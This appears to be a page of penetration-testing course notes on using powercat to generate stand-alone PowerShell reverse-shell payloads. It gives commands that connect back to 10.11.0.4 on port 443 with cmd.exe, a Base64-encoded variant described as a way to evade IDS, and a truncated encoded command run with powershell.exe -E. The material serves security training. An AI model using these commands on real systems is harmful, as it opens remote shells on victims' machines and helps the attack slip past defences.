---
description: Generating stand-alone payloads with powercat
---

# Stand-Alone Payloads

Powercat can also generate stand-alone payloads. In the context of powercat, a **payload is a set of PowerShell instructions as well as the portion of the powercat script itself** that only includes the features requested by the user.

The `-g` flag is used to induce powercat to generate a stand-alone payload.

#### Example

```powershell
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1

PS C:\Users\offsec> ./reverseshell.ps1
```

This example is not particularly practical as it shows creating and running a stand-alone payload on the same machine. It is mostly to demonstrate how the functionality works. In actuality an attacker would likely generate the payload on their own machine then arrange for it to be transported to and executed on the victim machine.

Additionally, stand-alone payloads like this one might be easily detected by IDS. The script that is generated is rather large with roughly 300 lines of code. It also contains a number of hard-coded strings that can easily be used in signatures for malicious activity. While the identification of any specific signature is outside of scope of this module. Plaintext malicious code such as this will **likely have a poor success rate** and will likely be caught by defensive software solutions

## Encoded Payloads

One method to potentially avoid IDS is

making use of PowerShell's ability to execute Base64 encoded commands. To generate a stand-alone encoded payload, we use the `-ge` option and once again redirect the output to a file.

{% code overflow="wrap" lineNumbers="true" %}
```powershell
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
```
{% endcode %}

The file will contain an encoded string that can be executed using the PowerShell `-E` (EncodedCommand) option.&#x20;

However, since the `-E` option was designed as a way to submit complex commands on the command line, the resulting `encodedreverseshell.ps1` script can not be executed in the same way as the unencoded payload.

The encoded command (contained in `encodedreverseshell.ps1`) must be passed in string form withe the `-E` flag.

{% code overflow="wrap" %}
```powershell
 PS C:\Users\offsec> powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA
...
```
{% endcode %}

Again this exmaple is not particularly practical as it shows the payload generation and execution happening on the same machine when this would likely not occur. After all, if powercat existed on the target machine why bother with the stand alone payloads?
